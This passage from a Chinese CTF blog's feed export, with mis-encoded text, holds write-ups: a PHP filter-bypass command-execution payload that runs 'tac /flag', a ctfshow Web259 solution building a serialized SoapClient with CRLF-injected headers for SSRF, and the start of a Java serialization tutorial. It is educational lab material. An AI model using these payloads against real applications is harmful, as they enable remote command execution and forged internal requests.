å°±ä¸ç”¨æ„é€ äº† åŒæ ·$æ²¡è¿‡æ»¤ ç›´æ¥ç”¨å°±è¡Œ</p><p>base_convert(37907361743,10,36)(dechex(1598506324))<img src="/2023/09/28/%E6%97%A5%E5%B8%B8%E9%A2%98%E7%9B%AE%E7%BB%83%E4%B9%A0%EF%BC%88%E4%B8%80%EF%BC%89/image/image-20231029211738989-1700015833096-29-1700989374410-40-1700994492325-16.png" alt="image-20231029211738989"></p><p>ä¸‹é¢æƒ³åŠæ³•ä¼ å…¥$_GET(1)</p><p>?c&#x3D;$kkk&#x3D;base_convert(37907361743,10,36)(dechex(1598506324));($$kkk){1}</p><p>æ€è·¯æ˜¯å…ˆä¼ å…¥ä¸€ä¸ªå˜é‡kkkï¼Œå†ç”¨$$kkkç­‰ä»·äºä¸$_GET </p><p> è¿™é‡Œå‘ç°ä¹‹å‰ä¸æ˜¯ä»€ä¹ˆå­—æ¯éƒ½èƒ½ç”¨çš„ï¼ŒæŠŠkkkæ¢æˆç™½åå•äº†éšä¾¿ä¸€ä¸ª</p><p>c&#x3D;$cos&#x3D;base_convert(37907361743,10,36)(dechex(1598506324));($$cos){1}</p><p>å…ˆè¯•è¯•phpinfo()</p><p>è¿™é‡Œåˆ©ç”¨å˜é‡æ‰§è¡Œå‡½æ•°ï¼Œåˆ©ç”¨äº†php7çš„ç‰¹æ€§</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">($a)($b)   //è¿™é‡Œaæ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œå†…å®¹æ˜¯ä¸€ä¸ªå‡½æ•°å//bä¹Ÿæ˜¯å­—ç¬¦ä¸²ï¼Œå†…å®¹æ˜¯å‚æ•°$a=&#x27;print_r&#x27;$b=&#x27;test&#x27;//å¯¹äºæ— å‚æ•°å‡½æ•°</span><br><span class="line">$a=&#x27;phpinfo&#x27;$a()</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">//æ— æ³•è¾“å‡º</span><br><span class="line">&lt;?php</span><br><span class="line">  $a=&#x27;phpinfo()&#x27;;</span><br><span class="line">  ($a)</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">//æ­£å¸¸è¾“å‡º</span><br><span class="line">&lt;?php</span><br><span class="line">  $a=&#x27;phpinfo&#x27;;</span><br><span class="line">  ($a)()</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>æ‰€ä»¥æˆ‘ä»¬ä¸ºäº†åé¢èƒ½æ‰§è¡Œï¼Œè¦ä¼ å…¥ä¸¤ä¸ªå˜é‡ ä¸€ä¸ªæ˜¯å‡½æ•°å ä¸€ä¸ªæ˜¯å‚æ•°</p><p>?c&#x3D;$cos&#x3D;base_convert(37907361743,10,36)(dechex(1598506324));($$cos){1}(($$cos){2})</p><p>æµ‹è¯•</p><p>æœ€ç»ˆpayload:?c&#x3D;$cos&#x3D;base_convert(37907361743,10,36)(dechex(1598506324));($$cos){1}(($$cos){2})&amp;1&#x3D;system&amp;2&#x3D;tac%20&#x2F;flag</p><p><img src="/2023/09/28/%E6%97%A5%E5%B8%B8%E9%A2%98%E7%9B%AE%E7%BB%83%E4%B9%A0%EF%BC%88%E4%B8%80%EF%BC%89/image/image-20231029212838216-1700015833096-31-1700989374411-42-1700994492325-15.png" alt="image-20231029212838216"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> wp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> å­¦ä¹ ç¬”è®° </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2023/09/24/Web259/"/>
      <url>/2023/09/24/Web259/</url>
      
        <content type="html"><![CDATA[<h1 id="Web259"><a href="#Web259" class="headerlink" title="Web259"></a>Web259</h1><p>å…ˆè´´ä¸€ä¸‹æºç </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$vip</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;vip&#x27;</span>]);</span><br><span class="line"><span class="comment">//vip can get flag one key</span></span><br><span class="line"><span class="variable">$vip</span>-&gt;<span class="title function_ invoke__">getFlag</span>();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>flag.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$xff</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;,&#x27;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_FOR&#x27;</span>]);</span><br><span class="line"><span class="title function_ invoke__">array_pop</span>(<span class="variable">$xff</span>);</span><br><span class="line"><span class="variable">$ip</span> = <span class="title function_ invoke__">array_pop</span>(<span class="variable">$xff</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$ip</span>!==<span class="string">&#x27;127.0.0.1&#x27;</span>)&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$token</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;token&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$token</span>==<span class="string">&#x27;ctfshow&#x27;</span>)&#123;</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;flag.txt&#x27;</span>,<span class="variable">$flag</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é¢˜ç›®ç•Œé¢å°±ä¸€ä¸ªç®€å•çš„getä¼ å‚ï¼Œæ¥æ”¶åˆ°çš„å€¼ååºåˆ—åŒ–ä¼ åˆ°getflag()å‡½æ•°</p><p>å…¶ä»–å•¥ä¹Ÿæ²¡ç»™ï¼Œæƒ³åˆ°å°±æ˜¯è¦ç”¨åˆ°åŸç”Ÿç±»</p><p>åé¢é¢˜ç›®ç•Œé¢ç»™çš„æºç ï¼Œé‡Œé¢è¦æ±‚ip&#x3D;127.0.0.1ï¼Œä»–åˆå¼€å¯äº†xffï¼Œæƒ³æ”¹åŒ…å‘åŒ…æ¥ç€ï¼Œä»–åˆè¿›è¡Œäº†ä¸¤æ¬¡popï¼Œè¿˜è¦tokençš„å€¼&#x3D;&#x3D;ctfshowï¼Œç»“åˆè¿™äº›ï¼ŒåŸºæœ¬ä¸Šå¯ä»¥ç¡®å®šç”¨SoapClientåŸç”Ÿç±»</p><p>è¿™é‡Œå…ˆä»‹ç»ä¸€ä¸‹é‡Œé¢çš„å‡½æ•°</p><blockquote><p><strong>explode()</strong> å‡½æ•°å¯ä»¥æŠŠå­—ç¬¦ä¸²æ‰“æ•£ä¸ºæ•°ç»„ã€‚</p><p>array_pop()å‡½æ•°ï¼šå»é™¤æ•°ç»„æœ€åä¸€ä¸ªå…ƒç´ ï¼Œè¿”å›æ•°ç»„çš„æœ€åä¸€ä¸ªå€¼ã€‚å¦‚æœæ•°ç»„æ˜¯ç©ºçš„ï¼Œæˆ–è€…éæ•°ç»„ï¼Œå°†è¿”å› NULLã€‚</p><p> file_put_contentså‡½æ•°ï¼šæŠŠ$flagå†™å…¥flag.txt</p><p>explode()å‡½æ•°ï¼šæŠŠå­—ç¬¦ä¸²æ‰“æ•£ä¸ºæ•°ç»„</p><p>ä»‹ç»å®Œå‡½æ•°ï¼Œåˆ†æä¸€ä¸‹å»è·å–flagçš„è¿‡ç¨‹ã€‚ é¢˜ç›®ä¸­ array_pop()å‡½æ•° ä½¿ç”¨äº†ä¸¤æ¬¡ï¼Œæœ€åå°†ipèµ‹ç»™$ipï¼Œ</p><p>è¿™é‡Œè¯´ä¸€ä¸‹è¿™ä¸ª array_pop()å‡½æ•°ä¸¤æ¬¡çš„è¿‡ç¨‹</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1#è¿”å›ï¼šç©º</span><br><span class="line">127.0.0.1,127.0.0.2#è¿”å›ï¼š127.0.0.1</span><br><span class="line">127.0.0.1,127.0.0.2,127.0.0.3#è¿”å›ï¼š127.0.0.2</span><br></pre></td></tr></table></figure></blockquote><p>è¿™é‡Œå°è¯•å»ä¼ªé€  X-Forwarded-Forï¼Œå‘ç°ä¸è¡Œï¼Œå› ä¸ºä½¿ç”¨äº†Cloudflareï¼Œè‡³äºå¦‚ä½•å»åˆ¤æ–­ä¸€ä¸ªç½‘ç«™æ˜¯å¦ä½¿ç”¨äº†Cloudflare</p><p>è‡³äºæ€ä¹ˆåˆ¤æ–­ä¸€ä¸ªç½‘ç«™æ˜¯å¦è¯•ç”¨äº†Cloudflareä»£ç†</p><p>æ¥ä¸‹æ¥æˆ‘ä»¬çœ‹ä¸€ä¸‹SoapClientåŸç”Ÿç±»</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">class SoapClient &#123;</span><br><span class="line">    /* Methods */</span><br><span class="line">    public __construct(?string $wsdl, array $options = [])</span><br><span class="line">    public __call(string $name, array $args): mixed</span><br><span class="line">    public __doRequest(</span><br><span class="line">        string $request,</span><br><span class="line">        string $location,</span><br><span class="line">        string $action,</span><br><span class="line">        int $version,</span><br><span class="line">        bool $oneWay = false</span><br><span class="line">    ): ?string</span><br><span class="line">    public __getCookies(): array</span><br><span class="line">    public __getFunctions(): ?array</span><br><span class="line">    public __getLastRequest(): ?string</span><br><span class="line">    public __getLastRequestHeaders(): ?string</span><br><span class="line">    public __getLastResponse(): ?string</span><br><span class="line">    public __getLastResponseHeaders(): ?string</span><br><span class="line">    public __getTypes(): ?array</span><br><span class="line">    public __setCookie(string $name, ?string $value = null): void</span><br><span class="line">    public __setLocation(?string $location = null): ?string</span><br><span class="line">    public __setSoapHeaders(SoapHeader|array|null $headers = null): bool</span><br><span class="line">    public __soapCall(</span><br><span class="line">        string $name,</span><br><span class="line">        array $args,</span><br><span class="line">        ?array $options = null,</span><br><span class="line">        SoapHeader|array|null $inputHeaders = null,</span><br><span class="line">        array &amp;$outputHeaders = null</span><br><span class="line">    ): mixed</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç”±äº<strong>SoapClient</strong>åŸç”Ÿç±»ä¸­åŒ…å«<code>__call</code>æ–¹æ³•ï¼Œå¹¶ä¸”æˆ‘ä»¬çŸ¥é“ï¼šå½“è°ƒç”¨ä¸€ä¸ªå¯¹è±¡ä¸­ä¸å­˜åœ¨çš„æ–¹æ³•æ—¶å€™ï¼Œä¼šæ‰§è¡Œ<code>call()</code>é­”æœ¯æ–¹æ³•ã€‚</p><p>å› æ­¤åœ¨CTFä¸­é€šå¸¸ä¼šå‡ºç°ä¸€ç§<strong>å­˜åœ¨è°ƒç”¨ä¸å­˜åœ¨çš„æ–¹æ³•</strong>ã€<strong>å¹¶ä¸”éœ€è¦æˆ‘ä»¬ä¼ªé€ è¯·æ±‚å¤´</strong>çš„é¢˜ç›®</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line"></span><br><span class="line">$vip = unserialize($_GET[&#x27;vip&#x27;]);</span><br><span class="line">//vip can get flag one key</span><br><span class="line">$vip-&gt;getFlag();</span><br></pre></td></tr></table></figure><p>çœ‹æºç å¯ä»¥çœ‹åˆ°ä»–ä¼šå¯¹ä¼ å…¥çš„vipè¿›è¡Œååºåˆ—åŒ–ï¼Œå¹¶ä¸”è°ƒç”¨getflagæ–¹æ³•ï¼Œæ˜¾ç„¶æ­¤å¤„æ²¡æœ‰å®šä¹‰getflagæ–¹æ³•ï¼Œå› æ­¤è€ƒè™‘åˆ°è·Ÿcallé­”æœ¯æ–¹æ³•æœ‰å…³ï¼ŒåŸç”Ÿç±»soapé‡Œæœ‰è¿™ä¸ªå‡½æ•°ï¼ŒåŠ ä¸Šè¯·æ±‚å¤´çš„è¦æ±‚</p><p>æˆ‘ä»¬æœ¬åœ°æµ‹è¯•ä¸€ä¸‹</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$client</span> = <span class="keyword">new</span> <span class="title class_">SoapClient</span>(<span class="literal">null</span>,<span class="keyword">array</span>(<span class="string">&#x27;uri&#x27;</span> =&gt; <span class="string">&#x27;http://127.0.0.1:9998/&#x27;</span> , <span class="string">&#x27;location&#x27;</span> =&gt; <span class="string">&#x27;http://127.0.0.1:9999/test&#x27;</span>));</span><br><span class="line"></span><br><span class="line"><span class="variable">$client</span>-&gt;<span class="title function_ invoke__">getFlag</span>();</span><br></pre></td></tr></table></figure><p><img src="/2023/09/24/Web259/1/hexoblog/img/image-20230924123610341.png" alt="image-20230924123610341"></p><p>ä»”ç»†è§‚å¯Ÿåï¼Œå‘ç°æ˜¯ä¸€ä¸ªPOSTè¯·æ±‚ï¼Œå¹¶ä¸”SOAPActionçš„å€¼æ˜¯å¯æ§çš„</p><p>ä½†æ˜¯ä»…ä»…ä¾é è¿™ä¸€å¤„ï¼Œæ²¡æœ‰åŠæ³•ä¼ªé€ æ•´ä¸€ä¸ªPOSTè¯·æ±‚ï¼Œå› ä¸ºContent-Typeæ˜¯xmlå½¢å¼çš„ï¼Œå¹¶ä¸”åé¢çš„ä¼ è¾“å†…å®¹ä¹Ÿéƒ½æ˜¯xmlå½¢å¼çš„ï¼Œä¸€èˆ¬æƒ…å†µä¸‹POSTä¼ é€’å‚æ•°çš„æ ¼å¼éƒ½æ˜¯è¡¨å•å½¢å¼çš„ï¼ˆapplication&#x2F;x-www-form-urlencoded)</p><p>å› æ­¤æˆ‘ä»¬å¯ä»¥æƒ³åŠæ³•ä¼ªé€ User-Agentå¤´ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$ua</span>=<span class="string">&quot;qingchuan&quot;</span>;</span><br><span class="line"><span class="variable">$client</span> = <span class="keyword">new</span> <span class="title class_">SoapClient</span>(<span class="literal">null</span>,<span class="keyword">array</span>(<span class="string">&#x27;uri&#x27;</span> =&gt; <span class="string">&#x27;http://127.0.0.1:9998/&#x27;</span> , <span class="string">&#x27;location&#x27;</span> =&gt; <span class="string">&#x27;http://127.0.0.1:9999/test&#x27;</span>,<span class="string">&#x27;user_agent&#x27;</span> =&gt; <span class="variable">$ua</span>));</span><br><span class="line"></span><br><span class="line"><span class="variable">$client</span>-&gt;<span class="title function_ invoke__">getFlag</span>();</span><br></pre></td></tr></table></figure><p><img src="/2023/09/24/Web259/1/hexoblog/img/image-20230924123849790.png" alt="image-20230924123849790"></p><p>å¯ä»¥çœ‹åˆ°æˆ‘ä»¬çš„USER-AGENTä¹Ÿè¯¥è¿›å»äº†ï¼Œå½“<strong>User-Agent</strong>æˆä¸ºäº†æˆ‘ä»¬çš„å¯æ§å‚æ•°åï¼Œ<strong>User-Agent</strong>ä¸‹æ–¹çš„<strong>Content-Type</strong>ä¹ŸåŒæ ·å¯ä»¥è¢«ä¼ªé€ ï¼Œåˆ©ç”¨<code>\r\n</code>æ¢è¡Œå³å¯ä¼ªé€ </p><p>å†æ¬¡ä¿®æ”¹åçš„ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$ua=&quot;qingchuan\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 13\r\n\r\ntoken=ctfshow&quot;;</span><br><span class="line">$client = new SoapClient(null,array(&#x27;uri&#x27; =&gt; &#x27;http://127.0.0.1:9998/&#x27; , &#x27;location&#x27; =&gt; &#x27;http://127.0.0.1:9999/test&#x27;,&#x27;user_agent&#x27; =&gt; $ua));</span><br><span class="line"></span><br><span class="line">$client-&gt;getFlag();</span><br></pre></td></tr></table></figure><p>ç°åœ¨æˆ‘ä»¬å·²ç»ä¼ªé€ å¥½äº†è¯·æ±‚åŒ…</p><p>ä»£ç ä¸­æœ‰å‡ ä¸ªæ³¨æ„çš„ç‚¹</p><ul><li>å› ä¸º$uaä¸­ç”¨åˆ°äº†<code>\r\n</code>è¿™ä¸¤ä¸ªæ¢è¡Œç¬¦ï¼Œå› æ­¤è¦ç”¨åŒå¼•å·åŒ…è£¹<a href="https://wooyun.js.org/drops/CRLF%20Injection%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E5%AE%9E%E4%BE%8B%E5%88%86%E6%9E%90.html">crlf</a></li><li>HTTPè¯·æ±‚å¤´ä¹‹é—´çš„å‚æ•°ç”¨ä¸€ç»„<code>\r\n</code>åˆ†å‰²å³å¯</li><li>HTTPè¯·æ±‚å¤´ä¸POSTDATAä¹‹é—´è¦ç”¨ä¸¤ä¸ª<code>\r\n</code>åˆ†å‰².</li><li>è®¾ç½®<strong>User-Agent</strong>æ—¶ï¼Œåº”å†™æˆ<strong>user_agent</strong></li></ul><p>ç›‘å¬ä¸€ä¸‹åœ¨</p><p><img src="/2023/09/24/Web259/1/hexoblog/img/image-20230924125424078.png" alt="image-20230924125424078"></p><p><img src="/2023/09/24/Web259/1/hexoblog/img/image-20230924125512870.png" alt="image-20230924125512870"></p><p>çº¢åœˆé‡Œçš„æ˜¯æœ‰æ•ˆè¯·æ±‚ï¼Œ</p><p>å› ä¸ºæˆ‘ä»¬è®¾ç½®äº†<strong>Content-Length</strong>çš„å€¼ä¸º<strong>13</strong>ï¼Œè¶…å‡º13ä¸ªå­—ç¬¦ä»¥å¤–çš„éƒ½ä¼šè¢«æœåŠ¡å™¨ä¸¢å¼ƒï¼Œæ‰€ä»¥å½±å“ä¸å¤§ã€‚</p><p>åœ¨æœ¬åœ°æµ‹è¯•å®Œæˆäº†ï¼Œæ¥ä¸‹æ¥æˆ‘ä»¬å°†ç›¸å…³å‚æ•°ä¿®æ”¹ä¸é¢˜ç›®ç›¸å¯¹åº”ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$ua = &quot;qingchuan\r\nX-Forwarded-For: 127.0.0.1,127.0.0.1\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 13\r\n\r\ntoken=ctfshow&quot;;</span><br><span class="line">$client = new SoapClient(null,array(&#x27;uri&#x27; =&gt; &#x27;http://127.0.0.1/&#x27; , &#x27;location&#x27; =&gt; &#x27;http://127.0.0.1/flag.php&#x27; , &#x27;user_agent&#x27; =&gt; $ua));</span><br><span class="line"></span><br><span class="line">print_r(urlencode(serialize($client)));</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O%3A10%3A%22SoapClient%22%3A5%3A%7Bs%3A3%3A%22uri%22%3Bs%3A17%3A%22http%3A%2F%2F127.0.0.1%2F%22%3Bs%3A8%3A%22location%22%3Bs%3A25%3A%22http%3A%2F%2F127.0.0.1%2Fflag.php%22%3Bs%3A15%3A%22_stream_context%22%3Bi%3A0%3Bs%3A11%3A%22_user_agent%22%3Bs%3A133%3A%22qingchuan%0D%0AX-Forwarded-For%3A+127.0.0.1%2C127.0.0.1%0D%0AContent-Type%3A+application%2Fx-www-form-urlencoded%0D%0AContent-Length%3A+13%0D%0A%0D%0Atoken%3Dctfshow%22%3Bs%3A13%3A%22_soap_version%22%3Bi%3A1%3B%7D</span><br></pre></td></tr></table></figure><p>ä¼ å…¥åè®¿é—®flag.txtå³å¯</p><p><img src="/2023/09/24/Web259/1/hexoblog/img/image-20230924125929067.png" alt="image-20230924125929067"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2023/09/22/Java%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/"/>
      <url>/2023/09/22/Java%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="Javaåºåˆ—åŒ–å’Œååºåˆ—åŒ–å­¦ä¹ "><a href="#Javaåºåˆ—åŒ–å’Œååºåˆ—åŒ–å­¦ä¹ " class="headerlink" title="Javaåºåˆ—åŒ–å’Œååºåˆ—åŒ–å­¦ä¹ "></a>Javaåºåˆ—åŒ–å’Œååºåˆ—åŒ–å­¦ä¹ </h1><p>å†™åœ¨å‰é¢ï¼šè°¨è®°javaååºåˆ—åŒ–å­¦ä¹ ï¼Œæˆ–è®¸æ˜¯ç®€å•çš„çš„å§</p><p>##å‰ç½®çŸ¥è¯†ï¼š</p><p>userç±»å’Œ**<code>Serialize_test_1 </code>**çš„å…³ç³»</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">User</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line"><span class="comment">//å®šä¹‰ç±»çš„ç§æœ‰å±æ€§name</span></span><br><span class="line">        <span class="keyword">private</span> String name;</span><br><span class="line">        <span class="comment">//å®šä¹‰setNameæ–¹æ³•</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="comment">//å½“å‰ç±»Userçš„nameç­‰äºsetNameä¼ é€’è¿›æ¥çš„name</span></span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//å®šä¹‰getNameæ–¹æ³•ï¼Œè¿”å›nameå€¼</span></span><br><span class="line">        <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> name;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Serialize_test_1</span> &#123;</span><br><span class="line"><span class="comment">//åºåˆ—åŒ–ï¼Œè¿”å›å€¼ä¸ºå­—èŠ‚ç±»å‹ï¼Œè¾“å…¥å€¼ä¸ºå¯¹è±¡Object</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">byte</span>[] serialize(<span class="keyword">final</span> Object obj) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"><span class="comment">//åˆ›å»ºå­—èŠ‚æ•°ç»„è¾“å‡ºæµå®ä¾‹ btout,å°†æ‰€æœ‰å‘é€åˆ°è¾“å‡ºæµçš„æ•°æ®ä¿å­˜åœ¨è¯¥å­—èŠ‚æ•°ç»„ç¼“å†²åŒºä¸­, ä¸ªäººç†è§£å°±æ˜¯è¯»æ•°æ®å¹¶æ”¾å…¥ç¼“å­˜åŒºï¼Œè¯»çš„æ•°æ®ä»¥å­—èŠ‚ç±»å‹çš„æ•°ç»„ä¿å­˜åœ¨ç¼“å†²åŒº</span></span><br><span class="line"><span class="type">ByteArrayOutputStream</span> <span class="variable">btout</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line"><span class="comment">//åˆ›å»ºobjOut å¯¹è±¡è¾“å‡ºæµå®ä¾‹,ä¹Ÿæ˜¯ç±»ä¼¼ä»¥ä¸Šçš„è¯»æ•°æ®ï¼Œä¸è¿‡æ“ä½œçš„æ˜¯å¯¹è±¡æµï¼Œä¸æ˜¯å­—èŠ‚æµï¼Œåºåˆ—åŒ–å¯¹é¡¹çš„ç±»ï¼Œä½¿å…¶å˜å¾—å¯ä»¥ä¼ è¾“ï¼Œæ“ä½œ</span></span><br><span class="line"><span class="type">ObjectOutputStream</span> <span class="variable">objOut</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(btout);</span><br><span class="line"><span class="comment">//è°ƒç”¨å¯¹è±¡è¾“å‡ºä¸ºæµçš„å¯¹è±¡æ–¹æ³•</span></span><br><span class="line">objOut.writeObject(obj);</span><br><span class="line"><span class="keyword">return</span> btout.toByteArray();</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//ååºåˆ—åŒ–,è¿”å›å€¼ç±»å‹ä¸ºå¯¹è±¡ç±»å‹ï¼Œè¾“å…¥ä¸ºå­—èŠ‚ç±»å‹</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">unserialize</span><span class="params">(<span class="keyword">final</span> <span class="type">byte</span>[] serialized)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"><span class="type">ByteArrayInputStream</span> <span class="variable">btin</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(serialized);</span><br><span class="line"><span class="type">ObjectInputStream</span> <span class="variable">objIn</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(btin);</span><br><span class="line"><span class="keyword">return</span> objIn.readObject();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"><span class="comment">//å®ä¾‹åŒ–å¯¹è±¡userï¼Œå¹¶è®¾ç½®å…¶ç§æœ‰å˜é‡nameå€¼ä¸ºposty</span></span><br><span class="line"><span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title 